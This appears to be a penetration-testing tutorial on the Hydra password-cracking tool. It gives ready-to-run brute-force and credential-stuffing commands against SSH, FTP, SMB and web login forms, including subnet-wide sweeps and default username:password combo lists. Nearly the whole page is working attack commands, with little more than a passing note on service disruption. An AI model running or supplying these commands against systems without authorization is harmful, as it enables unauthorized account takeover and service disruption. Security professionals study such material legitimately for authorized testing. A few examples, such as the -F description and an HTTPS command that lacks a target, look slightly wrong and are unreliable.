This guide covers the essential commands and options for using Hydra effectively in your penetration testing workflow. We'll walk through basic usage patterns, command structure, and provide practical examples for common scenarios.

## Getting Started

<Steps>
  <Step title="Verify Installation">
    First, ensure Hydra is properly installed on your system:
    
    ```bash
    hydra -h
    ```
    
    This should display the help menu with all available options.
  </Step>
  <Step title="Understand Command Structure">
    The basic Hydra command structure is:
    
    ```bash
    hydra [options] [-s PORT] TARGET PROTOCOL [MODULE-OPTIONS]
    ```
    
    Where:
    - `[options]` are general Hydra options
    - `[-s PORT]` specifies a non-default port
    - `TARGET` is the target host(s)
    - `PROTOCOL` is the protocol to attack
    - `[MODULE-OPTIONS]` are protocol-specific options
  </Step>
  <Step title="Prepare Wordlists">
    Before starting an attack, prepare your username and password lists:
    
    ```bash
    # Example username list
    echo -e "admin\nroot\nuser" > usernames.txt
    
    # Example password list
    echo -e "password\nadmin123\nqwerty" > passwords.txt
    ```
    
    For real attacks, use more comprehensive wordlists like those in `/usr/share/wordlists/` on Kali Linux.
  </Step>
</Steps>

## Basic Attack Examples

### SSH Attack

To perform a basic SSH brute force attack:

```bash
# Single username, password list
hydra -l admin -P passwords.txt ssh://192.168.1.100

# Username list, single password
hydra -L usernames.txt -p password123 ssh://192.168.1.100

# Username and password lists
hydra -L usernames.txt -P passwords.txt ssh://192.168.1.100
```

### Web Form Attack

For attacking a web login form:

```bash
# POST form attack
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

# GET form attack
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

<Note>
The http-post-form and http-get-form modules require three parameters separated by colons:
1. The page URL path
2. The form parameters with ^USER^ and ^PASS^ placeholders
3. The error message indicating a failed login attempt
</Note>

### FTP Attack

For attacking an FTP server:

```bash
# Basic FTP attack
hydra -L usernames.txt -P passwords.txt ftp://192.168.1.100

# FTP on non-standard port
hydra -L usernames.txt -P passwords.txt -s 2121 ftp://192.168.1.100
```

## Common Options

### Parallelism Control

Control the number of parallel connections:

```bash
# 16 parallel connections per target (default)
hydra -l admin -P passwords.txt ssh://192.168.1.100

# 4 parallel connections per target
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100

# 64 parallel connections total across all targets
hydra -l admin -P passwords.txt -T 64 -M targets.txt ssh
```

<Note>
Using too many parallel connections can cause service disruption or trigger security alerts. Start with lower values and increase gradually if needed.
</Note>

### Output Control

Control and save the output:

```bash
# Save results to a file
hydra -l admin -P passwords.txt ssh://192.168.1.100 -o results.txt

# Save in JSON format
hydra -l admin -P passwords.txt ssh://192.168.1.100 -o results.json -b json

# Verbose output
hydra -l admin -P passwords.txt -v ssh://192.168.1.100

# Very verbose output
hydra -l admin -P passwords.txt -V ssh://192.168.1.100
```

### Exit Conditions

Control when Hydra stops:

```bash
# Exit after finding first valid credential
hydra -l admin -P passwords.txt -f ssh://192.168.1.100

# Exit after finding N valid credentials
hydra -l admin -P passwords.txt -F -o found.txt ssh://192.168.1.100
```

## Practical Examples

### Multiple Targets

Attack multiple targets simultaneously:

```bash
# IP range
hydra -l admin -P passwords.txt 192.168.1.0/24 ssh

# From file
echo -e "192.168.1.100\n192.168.1.101" > targets.txt
hydra -l admin -P passwords.txt -M targets.txt ssh
```

### Username:Password Combinations

Use colon-separated username:password combinations:

```bash
# Create combinations file
echo -e "admin:password\nroot:toor\nuser:123456" > combos.txt

# Attack with combinations
hydra -C combos.txt ssh://192.168.1.100
```

### Empty and Special Passwords

Try empty passwords and username-as-password:

```bash
# Try null password, same as username, and reversed username
hydra -L usernames.txt -e nsr ssh://192.168.1.100
```

## Troubleshooting

### Connection Issues

If you're experiencing connection problems:

```bash
# Increase timeout (default is 30 seconds)
hydra -l admin -P passwords.txt -w 60 ssh://192.168.1.100

# Decrease connection attempts per second
hydra -l admin -P passwords.txt -c 10 ssh://192.168.1.100
```

### Service-Specific Issues

Some services may require additional configuration:

```bash
# HTTPS with SSL
hydra -l admin -P passwords.txt -S https-post-form "/:user=^USER^&pass=^PASS^:F=incorrect"

# Windows SMB with domain
hydra -l admin -P passwords.txt smb://192.168.1.100/domain
```
